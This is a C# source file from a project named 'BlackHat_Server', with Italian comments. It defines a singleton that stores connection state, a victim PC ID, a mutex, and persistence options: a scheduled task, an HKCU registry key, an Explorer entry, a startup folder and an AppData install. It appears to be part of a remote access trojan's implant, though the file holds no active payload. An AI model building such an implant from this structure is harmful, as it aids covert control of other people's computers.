using System.Collections.Generic;
using System.Net.Sockets;

namespace BlackHat_Server.Class
{
    internal class ST_Client
    {
        #region METHODS

        /// <summary>
        ///     Chiude tutti i canali ad eccezione del cnale principale
        /// </summary>
        public void CloseAllChannels()
        {
            foreach (var item in nsListaCanali)
                try
                {
                    item.Close();
                }
                catch
                {
                }

            nsListaCanali.Clear();
        }
        //----------------------------------------

        #endregion

        #region SINGLETON

        private static ST_Client _instance;

        private ST_Client()
        {
        }

        public static ST_Client Instance
        {
            get
            {
                if (_instance == null)
                    _instance = new ST_Client();

                return _instance;
            }
        }

        #endregion


        #region PROPRIETA'

        /// <summary>
        ///     VERSIONE DEL SERVER
        /// </summary>
        public string ServerVersion { get; set; }

        /// <summary>
        ///     Lista degli stream attivi
        /// </summary>
        public List<NetworkStream> nsListaCanali { get; set; } = new List<NetworkStream>();
        //---------------------------


        //CONNESSIONE

        public TcpClient Connessione { get; set; } = new TcpClient();
        //-----------------------------

        // SONO CONNESSO AL MAIN NETWORKSTREAM

        public bool isConnected { get; set; } = false;
        //-------------------------------


        // PASSWORD DI CONNESSIONE

        public string Password { get; set; }
        //-------------------------------

        // PORTA DI CONNESSIONE

        public int Port { get; set; }
        //-------------------------------

        // HOST DI CONNESSIONE

        public string Host { get; set; }
        //-------------------------------


        /// <summary>
        ///     Nome del server
        /// </summary>
        public string ServerName { get; set; }
        //-------------------------------

        /// <summary>
        ///     ID Univoco del PC
        /// </summary>
        public string UnivoqueID { get; set; }
        //-------------------------------


        /// <summary>
        ///     MUTEX
        /// </summary>
        public string sMutex { get; set; }

        #endregion


        #region INSTALLATION

        public bool UseTaskScheduler { get; set; }
        public string TaskSchedulerName { get; set; }
        public bool bUseHKCU { get; set; }
        public bool bUseExplorer { get; set; }
        public string sAppDataInstall { get; set; }
        public bool bUseStartupFolder { get; set; }
        public string sStartupFileName { get; set; }

        public string sHKCUEntry { get; set; }
        public string sExplorerEntry { get; set; }

        #endregion
    }
}